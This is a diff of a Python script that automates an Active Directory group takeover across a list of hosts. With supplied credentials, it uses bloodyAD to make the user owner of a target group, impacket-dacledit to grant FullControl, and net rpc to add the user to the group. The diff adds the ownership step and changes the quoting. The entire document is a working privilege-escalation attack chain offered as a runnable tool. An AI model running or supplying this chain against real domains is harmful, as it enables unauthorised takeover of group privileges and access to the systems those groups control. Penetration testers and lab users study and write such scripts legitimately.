@@ -44,7 +44,7 @@ def run_cmd(cmd, host=""):
 
     # Check for errors
     if result.returncode != 0 or "insufficient" in result.stderr.lower() or "error" in result.stderr.lower():
-        print("_______ You are member of the group :0 , Run WoGr _______")
+        print("_______ You are not allowed to modify the group! _______")
         if host:
             print(f"[-] Error on host: {host}")
         exit(1)
@@ -65,10 +65,20 @@ with open(hosts_file, "r") as f:
 
         print(f"[+] Processing host: {ip} {hostname}")
 
+        # Command 0: Set owner using bloodyAD
+        bloodyad_cmd = f'bloodyAD --host "{ip}" -d "{domain}" -u "{user}" -p "{password}" set owner {target_group} {user}'
+        print(f"[+] Setting owner for {target_group} using bloodyAD on host {hostname}")
+        result = subprocess.run(bloodyad_cmd, shell=True, capture_output=True, text=True)
+        print(result.stdout)
+        print(result.stderr)
+        if result.returncode != 0 or "error" in result.stderr.lower() or "fail" in result.stderr.lower():
+            print("[-] Failed to set owner with bloodyAD!")
+            exit(1)
+
         # Command 1: impacket-dacledit
-        dacledit_cmd = f"impacket-dacledit -action write -rights 'FullControl' -inheritance -principal '{user}' -target '{target_group}' '{domain}/{user}':'{password}'"
+        dacledit_cmd = f'impacket-dacledit -action write -rights "FullControl" -inheritance -principal "{user}" -target "{target_group}" "{domain}/{user}:{password}"'
         run_cmd(dacledit_cmd, host=hostname)
 
         # Command 2: net rpc group addmem
-        net_cmd = f"net rpc group addmem '{target_group}' '{user}' -U '{domain}/{user}%{password}' -S '{hostname}'"
+        net_cmd = f'net rpc group addmem "{target_group}" "{user}" -U "{domain}/{user}%{password}" -S "{hostname}"'
         run_cmd(net_cmd, host=hostname)
